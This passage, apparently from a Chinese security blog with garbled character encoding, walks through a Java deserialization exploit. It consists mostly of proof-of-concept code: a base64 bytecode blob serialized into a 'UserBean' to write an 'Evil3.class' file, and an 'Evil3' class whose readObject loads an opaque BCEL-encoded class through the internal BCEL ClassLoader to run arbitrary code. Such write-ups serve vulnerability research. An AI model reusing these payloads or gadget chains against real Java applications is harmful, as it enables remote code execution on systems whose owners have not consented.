2U2NAEACmdldEVuY29kZXIBAAdFbmNvZGVyAQAMSW5uZXJDbGFzc2VzAQAcKClMamF2YS91dGlsL0Jhc2U2NCRFbmNvZGVyOwEAC3RvQnl0ZUFycmF5AQAEKClbQgEAGGphdmEvdXRpbC9CYXNlNjQkRW5jb2RlcgEABmVuY29kZQEABihbQilbQgEABShbQilWAQATamF2YS9pby9QcmludFN0cmVhbQEAB3ByaW50bG4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAA9wcmludFN0YWNrVHJhY2UBAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsBAAlnZXRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kAQAGaW52b2tlAQA5KExqYXZhL2xhbmcvT2JqZWN0O1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQAUKClMamF2YS9sYW5nL09iamVjdDsAIQAeAAYAAQAfAAAAAwABACAAIQABACIAAAAvAAEAAQAAAAUqtwABsQAAAAIAIwAAAAYAAQAAAAoAJAAAAAwAAQAAAAUAJQAmAAAACQAnACgAAQAiAAAA9wAFAAUAAABOEgK4AANMKwO9AAS2AAUDvQAGtgAHTbsACFm3AAlOuwAKWS23AAs6BBkELLYADLIADbsADlm4AA8ttgAQtgARtwAStgATpwAITCu2ABWxAAEAAABFAEgAFAAEACMAAAAqAAoAAAANAAYADgAWAA8AHgAQACgAEQAuABIARQAWAEgAFABJABUATQAXACQAAAA+AAYABgA/ACkAKgABABYALwArACwAAgAeACcALQAuAAMAKAAdAC8AMAAEAEkABAAxADIAAQAAAE4AMwA0AAAANQAAAAwAAQAGAD8AKQA2AAEANwAAAAkAAvcASAcAOAQAAgA5ADoAAgAiAAAAygAGAAYAAABIEhZNEhe4AAMDvQAEtgAFA70ABrYAB8AAGE4ttgAZEhoEvQAEWQMSDlO2ABs6BBkELQS9AAZZAyxTtgAcwAAEOgUZBbYAHVexAAAAAwAjAAAAGgAGAAAAGQADABsAGgAeAC4AIQBBACIARwAjACQAAAA+AAYAAABIACUAJgAAAAAASAA7ADwAAQADAEUAPQA+AAIAGgAuAD8AQAADAC4AGgBBAEIABABBAAcAQwAqAAUANQAAAAwAAQBBAAcAQwA2AAUARAAAAAQAAQAUAAIARQAAAAIARgB6AAAACgABAFkAVgB5AAk=&quot;;</span></span><br><span class="line"></span><br><span class="line">        <span class="title class_">String</span> age = <span class="string">&quot;yv66vgAAADQAdAoABgAtCAAuCgAEAC8HADAKAAQAMQcAMgoAMwA0BwA1CgAIAC0HADYKAAoANwoACgA4CQA5ADoHADsKADwAPQoACAA+CgA/AEAKAA4AQQoAQgBDBwBECgAUAEUIAEYIAEcHAEgKAAYASQgASgoABABLCgBMAE0KAAQATgcALgcATwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAARtYWluAQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgEADVN0YWNrTWFwVGFibGUHAEQBAApyZWFkT2JqZWN0AQAeKExqYXZhL2lvL09iamVjdElucHV0U3RyZWFtOylWAQAKRXhjZXB0aW9ucwEAClNvdXJjZUZpbGUBAApFdmlsMy5qYXZhDAAgACEBAAVFdmlsMwwAUABRAQAPamF2YS9sYW5nL0NsYXNzDABSAFMBABBqYXZhL2xhbmcvT2JqZWN0BwBUDABVAFYBAB1qYXZhL2lvL0J5dGVBcnJheU91dHB1dFN0cmVhbQEAGmphdmEvaW8vT2JqZWN0T3V0cHV0U3RyZWFtDAAgAFcMAFgAWQcAWgwAWwBcAQAQamF2YS9sYW5nL1N0cmluZwcAXQwAXgBhDABiAGMHAGQMAGUAZgwAIABnBwBoDABpAGoBABNqYXZhL2xhbmcvRXhjZXB0aW9uDABrACEBDX8kJEJDRUwkJCRsJDhiJEkkQSRBJEEkQSRBJEEkQSQ4ZFYkNWJXJFRXJFUkZmUkOGUkcSQ5OWEkWUQkQyRJJGYxUiRjMWskNDBNJGM0JGJiJDQwJGFkJElYJGFjJEIkYWRBJHYkYTJtJDg3JGUxJEEkRCQ5MyQ5OTgzJEIkYjQkZjckN2JrbyRmNmZrJGVkJGNkJGRhJGQ2diRmNSRjOSQ5NyRlOGokOTckYWUkM2UkZjckYTEkN2QkZTlrJDlmJGZhJGQ0JGJlJGY0JGwkZDQkZWUkOTNJNCRSJGFjZSR6JGY2OWdfJGNlJGRlJGZiJGRiJDdiJDlmJGNjJGNmJGZmJGZjcCREJGMwViQ3YyRhNyRhMCRpJDg3JFUkM2MkOGMkYzMkODIkcWUkTSR1OCQ4MiRhMzIkRyRyJDNjJGEyJDQwJGMyJDkwJDg0YyRLJDg2cSQ1YyRjNiRKJFokOGYkY2F4TCRjNiRlMzI0JG4kaCQ5MSRhMSRjYiRZJDk1JGMwJDg1JGM2JDk4JDhjcSRaJFQkSyRNTCR3JGE4JGMxJDk0JE1TJGFjJHYkWiQ5NiRNJDViRlo4JDNiJHYkYzMkOTEkZTAkdyRmMCQ5MCRSZFokYzEkTWYkVjQkZTIkOTQkOGMkZDNiJDdkQiQ5MCR0ZSQzYyRyJGUzaSRKJGNmJHVoJGMxJGIzJFMkOWVjJEl1JFkkOTYkZTEkZWRmJHUkOGI2JGxlJEl0JGQ5JGEzJDljJGExJHdhWCRiYyQzZiQ5MyRnJGUxJGNlJDgwNmIkUyR0JDljJGIwdSRjZCQzYyRhYTkkODY4JGU3JDk5JEJvJGMycCRaViR0bGckM2MkY2VnJGI1VCRkYSRlNHEkY2RNcyRkZCQ5YiQ5YyRlMSRkYTR3JGUyJDdiJGJieiRTJDNkJGZhJDg0JGRkJGNlJG13JGU4ZiRkZSRkOSQ4MiRlOU0kTSRkNSQ4OUltWiQ4YiQ5YiQ5YTUkayRlZjI1JGQ3bSRYJDgyViQ4NiRyRSRDJDg3JDhmJDk5dCQ1ZCRiYyQ4ZiQ3YiRUJGY2aE5jJGIzJDg4JGU2JGI2JGM2JGMxJDkxSVIkYzhJJGI2JEkkYjJVJDkwbSQ4MmwkWGQkODckbSQzYiRGJGQ5VWokOTckZjQkaSRjMyRnJHQkYmIkYjIkZTlWJDhhJGE2ZngkM2VZcFpzWiR2JGE0JGJhJG9hJGNmJGFjJGNlJGQzJDllYSQ1YiRxJGFmTHokOWEkM2UkZDUkYTckYTVzJDg4UHkkciQzY08kYzUkYTUkZWFJJGU4JHMkYTAkWiQ5NCRhNCQ5ZHF0JGJlJGNmJFEkODBVJFckZTAkODgkODkkZWJUbERMJGMyJEwkdyQ1ZSRjNEskdyQ1ZSRjNiR4JE0kaiRFZSRjY00kTCRmN2MkOGUkOTYkZTIzJGI2MyRWJDliJGUxJHAxJGRkJGI2JDNjJDNlJGViJGM1JGkkN2UyJGMzJDVkJF92JGQ4XyRiYiQ3Y3YkYWZtJDhlciRlYSQ4MVdVJGJjJDg2MyRNJGI1JGUzJGRjJGNia3R6JDk0JGNjSCRjNiRlM1QkYTkkYWEkM2IkUVckZjEkM2EkZGUkNjBYdCR0JDlhJDk0JDg1JDhhNyRmMSRXJGMzJDllJGZmJGhPJDkyJDNiJGQzJGU2JGJjTiR4ciRiMSRiOGkkZGJyJEokQyRlNXZkJE0kY2IkODUkZTMkZDkkOTgkZWIkZGIkZGUkYmUkYTMkYTAkNWNOJGNhJDgzJDhlJGUxcUckYzUkZGIkbyRkMjUkYTUkRyRUJDllJDk3JDhlJGY1JFMkdiRmNSRlZSRoJGY2ciQ4ZDAkdiRjOSRjZSRhZiRhYiQ4YSRiM3gkODckZWEkYWUkYTdGJFokcSRkYiQ4ZFkkOTQkOTgkODR3VSRiYyQ4NyRmN1UkN2MkODBzJHEkaSRkYyRkZiRhZiRlMkMkN2NEJDlkJFQkZDdJJHokM2ViWHF3JDgyJDhlJGh1JFYkZTckZjExJGYxJEUkeSQ5ZWlRJHgkZTckNWNkJDNjJGMzJDhjJHR1JGNkJGIyRCR2JCQkYTgkZjgkRSQ5ZiRhYSRmOCRNJDlmSyRmOEIkYzVFJDdjJHYkSyQ3ZSQ4OW44JGRlJGE5JGUyJHgkN2MkYWQkZTIkaCRlMSR3OGZmJGM0JGM1QSRkZCRiNCR6SiRiYWYkOWVWU3EkWiRkZjIkYWMkYmMkZjckYTAxNCRkY216SiRhMCRZJDk4cCRJJGxqSSQzZCRlMzgkZGMkZjIkSyRlNyRkYWhzJGUyTiR6aiRmNCQzYSRDNCRkZmskYjkkY2VJJGQ4JDNlJGI4JDkxJFMkZjUkbyQ5MSRiMCQ5OVckNDAkYzUxaSQ5MyRlM1BBJGEzcyRjN24kY2UkOGQkZWQkN2VBJExZJGVjJDk5JGM3ZngkOGVNJGYzJDdmJGJkJG8kbiRjMyQ5YSRiNiRhNyRJJGVjJDVkJGQxJGI5TyRjOSRmMCQ1Y1YkZjMkN2MkUE41JGM1JGQ0JGNkdVNzJGY4aCRuJGI2SiQ5NyQ3YiQ5ZCRiYSRjZSQ1ZCRkNyRmMCQ5ZiRjOCRlODEkZjEkYWUkVyRmNyRlMCR2JGQ3JGUzJHYkN2YkeSRPOXYkOWEkM2IkZGUkdiQ4NiRiNSRmNyRjMCRlMSRkNiQ4YlQkZTEkZDlHJGQyZCRkNCRhNSQ4OSRCJHYkYWQkZDYkeiRyWUwkYTdmWCRFJGYwJGQyJGUyJDhiJGJiJHM0JHQkdmYkYzQkZDJ5JDdiJGYzMVIkVWUkZjUkeFEzJGI3JDkyJGVkJDg1JGNlJGNlJGIxJE9nJHkkY2ZIJFZGJGI4cCRhOCR4MSRjYiRiMyRjOTAkYzBnOSRjZE00JDNhJGNmJGJiWmxBJFEkSSRiNEokNWQkZTUkOTkkTSRMJGM5JGQ1JDdlJHgkOWQkZjEkYzgkOTJrJDg0WiQ3ZCRjMSQ5ZGEkYzckOGIkRWQkZGUkUSQ5ZFckbSRkMFczJCQkZWYkZTYkYTYkOTEkUyRfJEokYzMkYmEkYmJjJDVkJDNjJGMyJG8kSiQ4YiRmYSQ5ZCQ4YUpRJGU0JGskZmEkQkckZDMkdiRlNyRjNmhzaVYkRlEkOGYkYzlTNEskZWRoJGMyJEckZmEkNWQkVyQ3ZiRMJGMwJGM0M080TiRhNzgkYWQkOGMkZDYkNjAkY2JVJGIwJHg5JGYxJHMkYTIkYTEkaTMkODRWJGEyJGFhJGFmJDgwJGNkJGQ4QiRhYkwkbCRVeSRlMyRGJGRmJGQzJDk1JFYkQSRkMyRhZmFBJFdlJGUxJDQwJFckYzEkRCR6JGUxUCRkOXVIWSRjOCQ4OSRmNSQ4Y3YkZTVZJHUkN2R5JDg1JEtfQSR6JHUkYjQkODQkeCRmMyRkYiRmZSRmNSRoJGYyJGJhbSQ4MSQ4ZCRiNyRiNiRjMSRiYyRkZEIkYjIkTFckZjkkYWEkOGIkZGFCeW4kYjUkZTAkODYkRCRjNCRqJHckTCRkNyRxJDg1SCQ4YUgkVURtJHEkZTQkZDNIJGEwcCQ5MyRpJDkxJG9BUiR6JHQkZDUkM2FSVSQ3ZUJNJDVieSRlOCQzYVEkciRiYyRmOCRnJGVhJGIzaCRJRyRiMlhyJGskZTEkODgkb3Qkb0okbSRiYzR5JFpVJGUyJGI4JHl3JDVjTjQkWSR2T0YkZTQkeSRlZSRMJGFmJHUkZjYkaSQ5MSRmZCRjYiQ3ZkQkZTMkZDA1NEUkOTQkeVZmJGIxJGVhJHdWJDg3JGQ3ZCRiMTYkOGJ1JGMyJGU5JGEwbyRaJGNkZyRTJDkxJGYzJGUxJGU1JGY5JGNkcyRmOCQ5N1EkN2UkYTAkciQ4YiRmNSQ4M1dEJFIkZDgkUSQzYk4kbEplJGI5JFM5WEYkYjQkOWMkY2EkYTMkYTAkOWUkY2EkZDAkRSRmMSQ5YVdiJHQkVyRhMiRMVSRlOCRjNyRvJE0kYTEkZzYkYzI4Q19oZ1EkOGJzJGE4JGMzJHIkeSRHJGU1JDhiJGhoJGMwJF8kODgk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&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="title class_">UserBean</span> userBean = <span class="keyword">new</span> <span class="title class_">UserBean</span>(<span class="string">&quot;Evil3.class&quot;</span>,age,o);</span><br><span class="line">        byte[] bytes = <span class="title function_">serialize</span>(userBean);</span><br><span class="line"></span><br><span class="line">        <span class="title class_">System</span>.<span class="property">out</span>.<span class="title function_">println</span>(<span class="title class_">Base64</span>.<span class="title function_">getEncoder</span>().<span class="title function_">encodeToString</span>(bytes));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    public <span class="keyword">static</span> byte[] <span class="title function_">serialize</span>(<span class="title class_">Object</span> obj) throws <span class="title class_">IOException</span> &#123;</span><br><span class="line">        <span class="title class_">ByteArrayOutputStream</span> baos = <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="title class_">ObjectOutputStream</span> oos = <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">        oos.<span class="title function_">writeObject</span>(obj);</span><br><span class="line">        <span class="keyword">return</span> baos.<span class="title function_">toByteArray</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/image%205.png" alt="image.png"></p><p>æ–‡ä»¶å†™å…¥æˆåŠŸåç»­åˆ©ç”¨ååºåˆ—åŒ–è§¦å‘å†™å…¥çš„å­—èŠ‚ç </p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.<span class="property">sun</span>.<span class="property">org</span>.<span class="property">apache</span>.<span class="property">bcel</span>.<span class="property">internal</span>.<span class="property">util</span>.<span class="property">ClassLoader</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.<span class="property">io</span>.<span class="property">ByteArrayOutputStream</span>;</span><br><span class="line"><span class="keyword">import</span> java.<span class="property">io</span>.<span class="property">ObjectInputStream</span>;</span><br><span class="line"><span class="keyword">import</span> java.<span class="property">io</span>.<span class="property">ObjectOutputStream</span>;</span><br><span class="line"><span class="keyword">import</span> java.<span class="property">io</span>.<span class="property">Serializable</span>;</span><br><span class="line"><span class="keyword">import</span> java.<span class="property">lang</span>.<span class="property">reflect</span>.<span class="property">Method</span>;</span><br><span class="line"><span class="keyword">import</span> java.<span class="property">util</span>.<span class="property">Base64</span>;</span><br><span class="line"></span><br><span class="line">public <span class="keyword">class</span> <span class="title class_">Evil3</span> implements <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    public <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span>(<span class="params"><span class="built_in">String</span>[] args</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="title class_">Class</span>&lt;?&gt; evilClass = <span class="title class_">Class</span>.<span class="title function_">forName</span>(<span class="string">&quot;Evil3&quot;</span>);</span><br><span class="line">            <span class="title class_">Object</span> evilInstance = evilClass.<span class="title function_">getDeclaredConstructor</span>().<span class="title function_">newInstance</span>();</span><br><span class="line">            <span class="title class_">ByteArrayOutputStream</span> btout = <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="title class_">ObjectOutputStream</span> objOut = <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(btout);</span><br><span class="line">            objOut.<span class="title function_">writeObject</span>(evilInstance);</span><br><span class="line">            <span class="title class_">System</span>.<span class="property">out</span>.<span class="title function_">println</span>(<span class="keyword">new</span> <span class="title class_">String</span>(<span class="title class_">Base64</span>.<span class="title function_">getEncoder</span>().<span class="title function_">encode</span>(btout.<span class="title function_">toByteArray</span>())));</span><br><span class="line">            <span class="comment">//deserialize(btout.toByteArray());</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (<span class="title class_">Exception</span> e) &#123;</span><br><span class="line">            e.<span class="title function_">printStackTrace</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    private <span class="keyword">void</span> <span class="title function_">readObject</span>(<span class="title class_">ObjectInputStream</span> ois) throws <span class="title class_">Exception</span> &#123;</span><br><span class="line">        <span class="title class_">String</span> code = <span class="string">&quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$8dV$5bW$TW$U$fe$8e$q$99a$YD$C$I$f1R$c1k$40M$c4$bb$40$ad$IX$ac$B$adA$v$a2m$87$e1$A$D$93$9983$B$b4$f7$7bko$f6fk$ed$cd$da$d6v$f5$c9$97$e8j$97$ae$3e$f7$a1$7d$e9k$9f$fa$d4$be$f4$l$d4$ee$93I4$R$ace$z$f69g_$ce$de$fb$db$7b$9f$cc$cf$ff$fcp$D$c0V$7c$a7$a0$i$87$U$3c$8c$c3$82$qe$M$u8$82$a32$G$r$3c$a2$40$c2$90$84c$K$86q$5c$c6$J$Z$8f$caxL$c6$e324$n$h$91$a1$cb$Y$95$c0$85$c6$98$8cq$Z$T$K$ML$w$a8$c1$94$MS$ac$v$Z$96$M$5bFZ8$3b$v$c3$91$e0$w$f0$90$RdZ$c1$Mf$V4$e2$94$8c$d3b$7dB$90$te$3c$r$e3i$J$cf$uh$c1$b3$S$9ec$Iu$Y$96$e1$edf$u$8b6$le$It$d9$a3$9c$a1$waX$bc$3f$93$g$e1$ce$806b$S$t$9c$b0u$cd$3c$aa9$868$e7$99$Bo$c2p$ZV$tlg$3c$ceg$b5T$da$e4q$cdMs$dd$9b$9c$e1$da4w$e2$7b$bbz$S$3d$fa$84$dd$ce$mw$e8f$de$d9$82$e9M$M$d5$89ImZ$8b$9b$9a5$k$ef25$d7m$X$82V$86$rE$C$87$8f$99t$5d$bc$8f$7b$T$f6hNc$b3$88$e6$b6$c6$c1$91IR$c8I$b6$I$b2U$90m$82l$Xd$87$m$3b$F$d9Uj$97$f4$i$c3$g$t$bb$b2$e9V$8a$a6fx$3eYpZsZ$v$a4$ba$oa$cf$ac$ce$d3$9ea$5b$q$afLz$9a$3e$d5$a7$a5s$88Py$r$3cO$c5$a5$eaI$e8$s$a0$Z$94$a4$9dqt$be$cf$Q$80U$W$e0$88$89$ebTlDL$c2$L$w$5e$c4K$w$5e$c6$x$M$j$Ee$ccM$L$f7c$8e$96$e23$b63$V$9b$e1$p1$dd$b6$3c$3e$eb$c5$i$7e2$c3$5d$_v$d8_$bb$7cv$afm$8er$ea$81WU$bc$863$M$b5$e3$dc$cbktz$94$ccH$c6$e3T$a9$aa$3b$QW$f1$3a$de$60Xt$t$9a$94$85$8a7$f1$W$c3$9e$ff$hO$92$3b$d3$e6$bcN$xr$b1$b8i$dbr$J$C$e5vd$M$cb$85$e3$d9$98$eb$db$de$be$a3$a0$5cN$ca$83$8e$e1qG$c5$db$o$d25$a5$G$T$9e$97$8e$f5$S$v$f5$ee$h$f6r$8d0$v$c9$ce$af$ab$8a$b3x$87$ea$ae$a7F$Z$q$db$8dY$94$98$84wU$bc$87$f7U$7c$80s$q$i$dc$df$af$e2C$7cD$9d$T$d7I$z$3ebXqw$82$8e$hu$V$e7$f11$f1$E$y$9eiQ$x$e7$5cd$3c$c3$8c$tu$cd$b2D$v$$$a8$f8$E$9f$aa$f8$M$9fK$f8B$c5E$7c$v$K$7e$89n8$de$a9$e2$x$7c$ad$e2$h$e1$w8ff$c4$c5A$dd$b4$zJ$baf$9eVSq$Z$df2$ac$bc$f7$a014$dcmzJ$a0$Y$98p$I$ljI$3d$e38$dc$f2$K$e7$dahs$e2N$zj$f4$3a$C4$dfk$b9$ceI$d8$3e$b8$91$S$f5$o$91$b0$99W$40$c51i$93$e3PA$a3s$c7n$ce$8d$ed$7eA$LY$ec$99$c7fx$8eM$f3$7f$bd$o$n$c3$9a$b6$a7$I$ec$5d$d1$b9O$c9$f0$5cV$f3$7c$PN5$c5$d4$cduSs$f8h$n$b6J$97$7b$9d$ba$ce$5d$d7$f0$9f$c8$e81$f1$ae$W$f7$e0$v$d7$e3$v$7f$y$O9v$9a$3b$de$v$86$b5$f7$c0$e1$d6$8bT$e1$d9G$d2d$d4$a5$89$B$v$ad$d6$z$rYL$a7fX$E$f0$d2$e2$8b$bb$s4$t$vf$c4$d2y$7b$f31R$Ue$f5$xQ3$b7$92$ed$85$ce$ce$b1$Og$y$cfH$VF$b8p$a8$x1$cb$b3$c90$c0g9$cdM4$3a$cf$bbZlA$Q$I$b4J$5d$e5$99$M$L$c9$d5$7e$x$9d$f1$c8$92k$84Z$7d$c1$9da$c7$8b$Ed$de$Q$9dW$m$d0W3$$$ef$e6$a6$91$S$_$J$c3$ba$bbc$5d$3c$c2$o$J$8b$fa$9d$8aJQ$e4$k$fa$BG$d3$v$e7$c6hsiV$FQ$8f$c9S4K$edh$c2$G$fa$5d$W$7f$L$c0$c43O4N$a78$ad$8c$d6$60$cbU$b0$x9$f1$s$a2$a1$i3$84V$a2$aa$af$80$cd$d8B$abL$l$Uy$e3$F$df$d3$95$V$A$d3$afaA$We$e1$40$W$c1$D$z$e1P$d9uHY$c8$89$f5$8cv$e5Y$u$7dy$85$K_A$z$u$b4$84$x$f3$db$fe$f5$h$f2$bam$81$8d$b7$b6$c1$bc$ddB$b2$LW$f9$aa$8b$daByn$b5$e0$86$D$c4$j$w$L$d7$q$85H$8aH$UDm$q$e4$d3H$a0p$93$i$91$oAR$z$t$d5$3aRU$7eBM$5by$e8$3aQ$r$bc$f8$g$ea$b3h$IG$b2Xr$k$e1$88$ot$oJ$m$bc4y$ZU$e2$b8$yw$5cN4$Y$vOF$e4$y$ee$L$af$u$f6$i$91$fd$cb$7fD$e3$d054E$94$yVf$b1$ea$wV$87$d7d$b16$8bu$c2$e9$a0o$Z$cdg$S$91$f3$e1$e5$f9$cds$f8$97Q$7e$a0$r$8b$f5$83WD$R$d8$Q$3bN$lJe$b9$S9XF$b4$9c$ca$a3$a0$9e$ca$d0$E$f1$9aWb$t$W$a2$LU$e8$c7$o$M$a1$g6$c28C_hgQ$8bs$a8$c3$r$y$G$e5$8b$hh$c0$_$88$e07$y$c1$eft$d7$lX$8e$3f$b1$C$7f$a3$915$a3$89ub$r$h$c2$g$f2$b8$8a$9d$c0j6$82$b5$b9v8M$7eT$d6$87m$d8N$a7z$b6$X$3b$c8$t$p$8b$9d$d8$856j$a0$$$b6$Y$ed$c4$xC$3f$ab$40$H$f1$C$Y$a2$f0$ef$a7$5d$90$e2$f9$L$bbI$g$a2$a8$7e$c5$D$b4$93$u$a6$y$f6$90T$a6$c8$$$a2$T$7b$v$af$h$b8$40ytC$n$efA$f4$60$ly$7b$90$fe$b7$pp$93$C$ae$90$d0$xa$bf$84$87$K$d4$df$f8$fb$D$S$S$40$c5MB$89$60$93$d0$X$a4$I$fbs$ed$7d$f0_g$f9j$k$Y$L$A$A&quot;</span>;</span><br><span class="line">        <span class="comment">//new ClassLoader().loadClass(code).newInstance();</span></span><br><span class="line">        <span class="title class_">ClassLoader</span> classLoader = (<span class="title class_">ClassLoader</span>) <span class="title class_">Class</span>.<span class="title function_">forName</span>(<span class="string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span>).<span class="title function_">getDeclaredConstructor</span>().<span class="title function_">newInstance</span>();</span><br><span class="line"></span><br><span class="line">        <span class="title class_">Method</span> loadClassMethod = classLoader.<span class="title function_">getClass</span>().<span class="title function_">getMethod</span>(<span class="string">&quot;loadClass&quot;</span>, <span class="title class_">String</span>.<span class="property">class</span>);</span><br><span class="line"></span><br><span class="line">        <span class="title class_">Class</span>&lt;?&gt; loadedClass = (<span class="title class_">Class</span>&lt;?&gt;) loadClassMethod.<span class="title function_">invoke</span>(classLoader, code);</span><br><span class="line">        loadedClass.<span class="title function_">newInstance</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯è¿™é‡Œæˆ‘æœ¬åœ°ä¸€ç›´å¤±è´¥ï¼Œåç»­å‘ç°ç§»åŠ¨jdkåˆ°<code>/usr/lib/jvm/</code> ä¸‹å°±è¡Œäº†ï¼Œå¦å¤–ä¸Šé¢è¿™ä¸ªpocè¿è¡Œå¾—æ”¾åœ¨Javaç›®å½•ä¸‹ï¼Œåå°„ä¸èƒ½åŠ åŒ…åï¼Œä¸ç„¶åç»­åŠ è½½ä¼šåŠ è½½ä¸åˆ°</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/image%206.png" 